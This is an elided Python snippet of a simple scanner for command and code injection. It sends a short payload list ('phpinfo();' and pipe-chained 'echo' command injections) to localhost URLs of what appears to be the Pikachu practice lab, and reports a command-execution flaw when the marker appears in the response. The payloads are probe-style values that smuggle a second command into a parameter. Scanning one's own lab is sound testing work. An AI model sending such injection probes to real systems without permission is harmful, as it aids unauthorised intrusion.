...
payloads = ['phpinfo();',
            '"phpinfo();',
            "'phpinfo();",
            '127.0|echo upload_max_filesize',
            '127.0"|echo upload_max_filesize',
            "127.0'|echo upload_max_filesize",]
...
def scan_get(url,headers):
    ...
    try:
        ...
        if b'upload_max_filesize' in r.content:
            print('存在命令执行漏洞！！！')
            return 'GET:'+url
...
url = 'http://127.0.0.1/pik/vul/rce/rce_ping.php?ipaddress=1&submit=ping&kid=1'
print(Get_Paylpad(url))
url2 = 'http://127.0.0.1/pik/vul/rce/rce_eval.php?txt=666&submit=ping&kid=1'
print(Get_Paylpad(url2))